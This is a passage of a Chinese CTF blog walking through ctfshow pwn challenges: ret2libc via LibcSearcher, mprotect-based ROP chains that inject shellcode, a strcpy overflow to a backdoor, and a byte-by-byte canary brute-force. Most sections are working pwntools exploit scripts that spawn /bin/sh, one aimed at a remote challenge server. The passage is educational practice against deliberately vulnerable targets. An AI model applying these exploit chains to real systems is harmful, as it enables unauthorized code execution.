<li>lib32目录：这是存放32位架构的共享库的目录，但它主要用于64位系统的多架构支持。例如，64位的Linux系统可能需要兼容32位应用程序，这时候就会使用lib32目录来存放这些32位的共享库。通常位于<code>/usr/lib32</code>或者<code>/lib32</code>目录下。</li>
<li>lib64目录：这是存放64位架构的共享库的目录。在64位系统中，这是主要的共享库目录，用于存放64位的共享库文件。通常位于<code>/usr/lib64</code>或者<code>/lib64</code>目录下。</li>
<li>libx32目录：这是特定于x32 ABI（Application Binary Interface）的共享库目录。x32 ABI是一种特殊的ABI，它允许在64位系统上运行32位应用程序，但是使用更大的寄存器集，从而提高性能。libx32目录用于存放这种特定格式的共享库。通常位于<code>/usr/libx32</code>或者<code>/libx32</code>目录下。</li>
</ol>
<p>总结一下，这四个目录是为了在不同的架构和ABI条件下存放共享库文件，确保系统能够正确加载和运行应用程序。通常情况下，64位系统会使用lib64目录作为主要的共享库目录，同时lib32和libx32目录用于兼容32位和特定x32 ABI的应用程序。不过，请注意这些目录的具体位置可能会因Linux发行版和系统配置而有所不同。</p>
</blockquote>
<p><strong>注意点</strong>：这里的libc用网站查阅脚本本地可以打通，远程不行，于是用了libcSeacher</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(BINARY)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(BINARY)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28187</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">s=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        gdb.attach(p,s)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">x, y</span>): <span class="keyword">return</span> log.success(<span class="string">f&#x27;<span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;<span class="built_in">hex</span>(y)&#125;</span>&#x27;</span>)</span><br><span class="line">puts   = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6B</span> + <span class="number">4</span>) + p32(puts) + p32(main) + p32(puts_got)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6B</span> + <span class="number">4</span>) + p32(system) + p32(main) + p32(binsh)</span><br><span class="line">dbg()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：对于这个脚本，一般用LibcSeacher的时候可能会返回多个Libc版本，为了保证代码的健壮性，可以用<code>ldd --version</code>在本地调试的时候直接查看本地的libc版本这样的话，本地调试回快很多。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] There are multiple libc that meet current constraints :</span><br><span class="line">0 - libc6-i386_2.27-3ubuntu1_amd64</span><br><span class="line">1 - libc6_2.11.1-0ubuntu7.14_i386</span><br><span class="line">2 - libc6_2.11.1-0ubuntu7.15_i386</span><br><span class="line">3 - libc6_2.31-2_i386</span><br><span class="line">[+] Choose one : 2</span><br></pre></td></tr></table></figure>

<h2 id="pwn49-静态编译：修改内存权限mprotect"><a href="#pwn49-静态编译：修改内存权限mprotect" class="headerlink" title="pwn49(静态编译：修改内存权限mprotect)"></a>pwn49(静态编译：修改内存权限mprotect)</h2><p>对于静态编译的程序，可以用file或者ldd命令查看。</p>
<p><strong>静态编译特征</strong>：所有程序依赖的库函数和代码都被编译成最终的可执行文件。这意味着可执行文件包含了所有需要的代码，不需要依赖外部的动态链接库。所以文件可能会比较大，用IDA查看的话反编译的函数也很多，但是运行效率肯定会很高。</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ldd ./pwn</span><br><span class="line">$ <span class="keyword">not</span> a dynamic executable</span><br><span class="line">$ file pwn</span><br><span class="line">$ ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>用vmmap查看内存布局的时候，可以看到stack是不可执行状态，所以我们要使用mprotect函数修改可执行权限</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x8048000  <span class="number">0</span>x80d7000  r-xp    <span class="number">8</span>f000      <span class="number">0</span> /mnt/d/Yixin/Download/pwn</span><br><span class="line"><span class="number">0</span>x80d8000  <span class="number">0</span>x80dc000  rw-p     <span class="number">4000</span>  <span class="number">8</span>f000 /mnt/d/Yixin/Download/pwn</span><br><span class="line"><span class="number">0</span>x80dc000  <span class="number">0</span>x80ff000  rw-p    <span class="number">23000</span>      <span class="number">0</span> [heap]</span><br><span class="line"><span class="number">0</span>xf7ff8000 <span class="number">0</span>xf7ffc000 r--p     <span class="number">4000</span>      <span class="number">0</span> [vvar]</span><br><span class="line"><span class="number">0</span>xf7ffc000 <span class="number">0</span>xf7ffe000 r-xp     <span class="number">2000</span>      <span class="number">0</span> [vdso]</span><br><span class="line"><span class="number">0</span>xfffdd000 <span class="number">0</span>xffffe000 rw-p    <span class="number">21000</span>      <span class="number">0</span> [stack]</span><br></pre></td></tr></table></figure>

<h3 id="mprotect函数原型"><a href="#mprotect函数原型" class="headerlink" title="mprotect函数原型"></a>mprotect函数原型</h3><a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230803175812533.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230803175812533.png"  class="" lazyload></a>

<p>这里的注意点就两个：</p>
<ol>
<li>开始碧血是内存的起始地址，长度是页大小的整数倍</li>
<li>没必要将整个栈空间执行权限都进行修改，随便选择一个空间地址进行修改权限</li>
</ol>
<p>这里可以选择的段很多，举个例子bss段和got.plt段</p>
<blockquote>
<p><strong>注意点</strong>：可以用Ctfl + S 调出IDA Pro  所有段的跳转概览图</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.got.plt	 080DA000	080DA044	R	W</span><br><span class="line">.bss	     080DB320	080DBFFC	R	W	</span><br></pre></td></tr></table></figure>

<p>这里我们选择.got.plt的地址0x80DA000，找可写的段</p>
<p><strong>原因</strong>：这里不选择bss段的开头0x80DB320，因为指定的内存区间必须包含整个内存页（4K），起始地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍。</p>
<h3 id="read函数原型"><a href="#read函数原型" class="headerlink" title="read函数原型"></a>read函数原型</h3><blockquote>
<p>ssize_t read(int fd, void * buf, size_t count)<br>函数说明：read()会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中. 若参数count 为0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mprotect = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">M_addr  = <span class="number">0x80DA000</span></span><br><span class="line">M_size  =  <span class="number">0x1000</span></span><br><span class="line">M_proc  = <span class="number">7</span></span><br><span class="line">pop_ebx_esi_edi = <span class="number">0x08049bd9</span> <span class="comment"># pop ebx ; pop esi ; pop edi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mprotect return read</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span> + <span class="number">4</span>) + p32(mprotect) + p32(pop_ebx_esi_edi) + p32(M_addr) + p32(M_size) + p32(M_proc)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># read return shellcode</span></span><br><span class="line">payload += p32(read) +p32(pop_ebx_esi_edi) + p32(<span class="number">0</span>) + p32(M_addr) +p32(M_size) + p32(M_addr)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pop-edx"><a href="#pop-edx" class="headerlink" title="pop_edx"></a>pop_edx</h3><p>需要解释的点：</p>
<ul>
<li><p>为什么要用参数把pop给扔出去呢？<br>因为不扔出去的话，后面的函数无法执行，两种情况</p>
<ol>
<li><p>两个函数以上的构成的rop链，下一个函数的地址不能作为上一个函数返回地址</p>
</li>
<li><p>第一个函数参数大于等于二的情况下，第二个函数作为返回地址时参数会受到影响</p>
<p><strong>操作</strong>：<strong>需要通过将参数移动到寄存器从而执行下一个函数（保证ESP在上一个函数执行完之后可以指向下一个函数的开头）</strong></p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 两个函数，下一个函数的地址可以作为上一个函数的返回地址</span></span><br><span class="line">p32(puts) + p32(system) + p32(puts_got) + p32(binsh)</span><br><span class="line"><span class="comment"># 两个函数，下一个函数的地址不能作为上一个函数的返回地址p</span></span><br><span class="line">p32(puts) + p32(pop_edx_ret) + p32(puts_got) + p32(system) + p32(system_ret) + p32(binsh)</span><br><span class="line"><span class="comment"># 第一个函数参数大于等于二的情况下，第二个函数作为返回地址时参数会受到影响</span></span><br><span class="line"><span class="comment"># 错误示范</span></span><br><span class="line">p32(read) + p32(system) + p32(arg1) + p32(arg2) + p32(arg3)</span><br><span class="line"><span class="comment"># 正确示范</span></span><br><span class="line">p32(read) + p32(pop_edx_ebp_edi) + p32(arg1) + p32(arg2) + p32(arg3) + p32(system) + p32(system_ret) + p32(binsh)</span><br><span class="line"><span class="comment"># 复杂情况</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span> + <span class="number">4</span>) + p32(mprotect) + p32(pop_ebx_esi_edi) + p32(M_addr) + p32(M_size) + p32(M_proc)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># read return shellcode</span></span><br><span class="line">payload += p32(read) +p32(pop_ebx_esi_edi) + p32(<span class="number">0</span>) + p32(M_addr) +p32(M_size) + p32(M_addr)</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="pwn50-mprotect-ret2libc"><a href="#pwn50-mprotect-ret2libc" class="headerlink" title="pwn50(mprotect ret2libc )"></a>pwn50(mprotect ret2libc )</h2><h3 id="彩蛋：解决中文输入法问题"><a href="#彩蛋：解决中文输入法问题" class="headerlink" title="彩蛋：解决中文输入法问题"></a>彩蛋：解决中文输入法问题</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考链接：https://zhuanlan.zhihu.com/p/508797663</span></span><br><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">~/.pam_environment</span><br><span class="line"><span class="comment"># 加入以下几行：</span></span><br><span class="line">GTK_IM_MODULE DEFAULT=fcitx</span><br><span class="line">QT_IM_MODULE DEFAULT=fcitx</span><br><span class="line">XMODIFIERS DEFAULT=@im=fcitx</span><br><span class="line">SDL_IM_MODULE DEFAULT=fcitx</span><br><span class="line"><span class="comment"># 重启即可</span></span><br></pre></td></tr></table></figure>

<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">puts = elf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">gets = elf.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">gets = elf.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">ctfshow = elf.symbols[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x4007e3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">ret = <span class="number">0x4004fe</span>     <span class="comment"># ret</span></span><br><span class="line">buf = <span class="number">0x602050</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts) + p64(ctfshow)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Hello CTFshow&#x27;</span>,payload)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;puts addr&#x27;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    <span class="comment"># 用本地的libc不需要LibcSearcher</span></span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line">    lg(<span class="string">&#x27;system_addr&#x27;</span>,system) </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">    system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">    binsh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+ p64(ret) + p64(pop_rdi) +p64(binsh) + p64(system)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Hello CTFshow&#x27;</span>,payload)</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>

<h3 id="mprotect-（shellcode-记得架构要对）"><a href="#mprotect-（shellcode-记得架构要对）" class="headerlink" title="mprotect （shellcode 记得架构要对）"></a>mprotect （shellcode 记得架构要对）</h3><blockquote>
<p>注意：对于陌生函数，用man命令可以查看函数原型</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># 找4k开头，ee可写，长度为4k整数倍的内存</span></span><br><span class="line">M_addr = <span class="number">0x601000</span></span><br><span class="line">M_size = <span class="number">0x1000</span></span><br><span class="line">M_prot = <span class="number">0x7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    <span class="comment"># 用本地的libc不需要LibcSearcher</span></span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    pop_rdx_r12 = libc_base + <span class="number">0x000000000011f497</span> <span class="comment"># pop rdx ; pop r12 ; ret</span></span><br><span class="line">    mprotect_addr = libc_base + libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>] </span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line">    lg(<span class="string">&#x27;mprotect_addr&#x27;</span>,mprotect_addr) </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">    pop_rsi_ret = libc_base + <span class="number">0x0000000000023a6a</span></span><br><span class="line">    pop_rdx_ret = libc_base + <span class="number">0x0000000000001b96</span></span><br><span class="line">    mprotect_addr = libc_base + libc.dump(<span class="string">&#x27;mprotect&#x27;</span>)</span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line">    lg(<span class="string">&#x27;mprotect_addr&#x27;</span>,mprotect_addr) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    payload  = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(M_addr)</span><br><span class="line">    payload += p64(pop_rsi_r15)</span><br><span class="line">    payload += p64(M_size)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(pop_rdx_r12)</span><br><span class="line">    payload += p64(M_prot)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(mprotect_addr)</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(M_addr)</span><br><span class="line">    payload += p64(gets)+p64(ret)</span><br><span class="line">    payload += p64(M_addr)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    payload  = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(M_addr)</span><br><span class="line">    payload += p64(pop_rsi_ret)</span><br><span class="line">    payload += p64(M_size)</span><br><span class="line">    payload += p64(pop_rdx_ret)</span><br><span class="line">    payload += p64(M_prot)</span><br><span class="line">    payload += p64(mprotect_addr)</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(M_addr)</span><br><span class="line">    payload += p64(gets)+p64(ret)</span><br><span class="line">    payload += p64(M_addr)    </span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Hello CTFshow&#x27;</span>,payload)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>



<h2 id="pwn51-逆向分析漏洞，strcpy函数漏洞"><a href="#pwn51-逆向分析漏洞，strcpy函数漏洞" class="headerlink" title="pwn51(逆向分析漏洞，strcpy函数漏洞)"></a>pwn51(逆向分析漏洞，strcpy函数漏洞)</h2><p>这个题的漏洞是一个I换七个字母IronMan，需要覆盖118个字节，输入16个I即可，逻辑很简单，但是需要逆向分析</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">back_door = <span class="number">0x0804902E</span></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">16</span> + p32(back_door)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn52（函数传参调试控制）"><a href="#pwn52（函数传参调试控制）" class="headerlink" title="pwn52（函数传参调试控制）"></a>pwn52（函数传参调试控制）</h2><p>这个需要逆向参数，然后根据参数传参即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6C</span>+<span class="number">4</span>) + p32(flag) + p32(<span class="number">0</span>) + p32(a1) + p32(a2)</span><br></pre></td></tr></table></figure>

<h2 id="pwn53-canary保护与爆破绕过"><a href="#pwn53-canary保护与爆破绕过" class="headerlink" title="pwn53(canary保护与爆破绕过)"></a>pwn53(canary保护与爆破绕过)</h2><p>方法：逐位爆破</p>
<p>gdb调试查看canary的内存信息，然后写脚本进行爆破</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /4bx 0x804b04c</span><br><span class="line">0x804b04c &lt;global_canary&gt;:	0x31	0x32	0x33	0x31</span><br><span class="line">pwndbg&gt; x /4bs 0x804b04c</span><br><span class="line">0x804b04c &lt;global_canary&gt;:	<span class="string">&quot;1231&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="爆破脚本"><a href="#爆破脚本" class="headerlink" title="爆破脚本"></a>爆破脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">canary = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 存入每一位爆破成功的值</span></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xFF</span>):</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        p = process(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + canary + p8(c)</span><br><span class="line">        <span class="comment"># 保证后三位不变，line会多一个回车符</span></span><br><span class="line">        p.sendafter(<span class="string">b&#x27;$&#x27;</span>, payload)</span><br><span class="line">        p.recv(<span class="number">1</span>)</span><br><span class="line">        ans = p.recv()</span><br><span class="line">        <span class="built_in">print</span>(ans)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;Canary Value Incorrect!&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> ans:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;The index(<span class="subst">&#123;i&#125;</span>),value(<span class="subst">&#123;c&#125;</span>)&#x27;</span>)</span><br><span class="line">            s.append(<span class="built_in">chr</span>(c))</span><br><span class="line">            canary += p8(c)</span><br><span class="line">            <span class="built_in">print</span>(canary)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;trying... ...&#x27;</span>)</span><br><span class="line">        p.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Canary:&#x27;</span>,canary)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b<span class="string">&#x27;Where is the flag?\n&#x27;</span></span><br><span class="line">The index(3),value(49)</span><br><span class="line">b<span class="string">&#x27;1231&#x27;</span></span><br><span class="line">[<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;1&#x27;</span>]</span><br><span class="line">Canary: b<span class="string">&#x27;1231&#x27;</span></span><br></pre></td></tr></table></figure>



